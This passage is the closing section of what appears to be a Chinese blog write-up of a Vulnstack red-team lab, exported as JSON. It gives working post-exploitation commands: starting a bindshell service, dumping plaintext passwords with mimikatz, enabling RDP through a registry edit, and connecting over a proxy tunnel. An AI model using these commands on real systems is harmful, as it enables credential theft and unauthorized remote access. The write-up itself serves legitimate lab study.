class=\"hljs-attribute\">sc</span> \\\\WIN-ENS<span class=\"hljs-number\">2</span>VR<span class=\"hljs-number\">5</span>TR<span class=\"hljs-number\">3</span>N start bindshell<br></code></pre></td></tr></table></figure>\n<p>拿到 130 的新 shell</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550887.png\" alt=\"image-20211114012104545\" class=\"lazyload\"></p>\n<p>猕猴桃拿密码</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arduino\">mimikatz privilege::debug<br>mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550717.png\" alt=\"image-20211114012906263\" class=\"lazyload\"></p>\n<p>拿到明文密码</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550550.png\" alt=\"image-20211114013013491\" class=\"lazyload\"></p>\n<p>开启 3389</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">&quot; &quot;</span>Server <span class=\"hljs-regexp\">/v fDenyTSConnections /</span>t REG_DWORD <span class=\"hljs-regexp\">/d 0 /</span>f<br></code></pre></td></tr></table></figure>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550855.png\" alt=\"image-20211114013625435\" class=\"lazyload\"></p>\n<p>用 kali 的 RDP 工具，走之前的 ew 代理连接</p>\n<p><code>proxychains4 rdesktop 192.168.183.130</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551462.png\" alt=\"image-20211114014338299\" class=\"lazyload\"></p>\n<p>或者免去以上步骤，直接 CS 的 VNC</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551829.png\" alt=\"image-20211114013338451\" class=\"lazyload\"></p>\n<h2 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\">#</a> Reference</h2>\n<p><a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/6/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/271892.html\">https://www.freebuf.com/articles/web/271892.html</a></p>\n<p><a href=\"https://www.dazhuanlan.com/oliiiflorrr/topics/1144804\">https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</a></p>\n<p><a href=\"https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /</a></p>\n<p><a href=\"https://www.cnblogs.com/zhangshengxiang/p/11842326.html\">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>\n<p><a href=\"http://www.hackdig.com/09/hack-492089.htm\">http://www.hackdig.com/09/hack-492089.htm</a></p>\n<p><a href=\"https://blog.csdn.net/zy15667076526/article/details/116059592\">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p>\n",
            "tags": []
        }
    ]
}